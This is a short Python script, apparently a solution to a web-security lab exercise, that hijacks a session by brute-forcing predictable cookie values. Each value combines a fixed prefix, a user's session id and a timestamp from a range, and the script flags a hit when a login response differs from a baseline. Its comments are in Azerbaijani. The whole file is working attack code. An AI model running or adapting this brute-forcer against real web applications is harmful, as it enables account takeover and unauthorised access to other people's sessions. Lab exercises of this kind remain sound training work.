#!/usr/bin/python3
import requests
import json

prefix = "d367c8f1-fa74-49f6-8a4"
session_id = "9718622"
target_url = "http://web0x01.hbtn/api/a1/hijack_session/login"

start_timestamp = 17687513070
end_timestamp = 17687513229

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "Connection": "keep-alive"
}

# Sənin session cookie-n
your_session = "9718623"

# Login data (boş və ya random)
login_data = json.dumps({"email": "test@test.com", "password": "test"})

# Baseline
baseline_cookies = {
    "hijack_session": f"{prefix}-9999999-0000000000",
    "session":  your_session
}
baseline = requests.post(target_url, data=login_data, cookies=baseline_cookies, headers=headers, timeout=10)
baseline_len = len(baseline.text)
print(f"[*] Baseline response:  {baseline.text[:200]}")
print(f"[*] Baseline length: {baseline_len}")
print(f"[*] Araliq: {start_timestamp} - {end_timestamp}\n")

for ts in range(start_timestamp, end_timestamp + 1):
    cookie_value = f"{prefix}-{session_id}-{ts}"
    
    cookies = {
        "hijack_session": cookie_value,
        "session": your_session
    }
    
    r = requests.post(target_url, data=login_data, cookies=cookies, headers=headers, timeout=10)
    
    # Fərqli cavab və ya "success" varsa
    if len(r.text) != baseline_len or "success" in r.text.lower():
        print(f"\n[+] TAPILDI!")
        print(f"[+] Timestamp: {ts}")
        print(f"[+] Cookie: {cookie_value}")
        print(f"[+] Response: {r.text}")
        break
    
    print(f"[*] {ts}", end='\r')
else:
    print("\n[-] Tapilmadi")
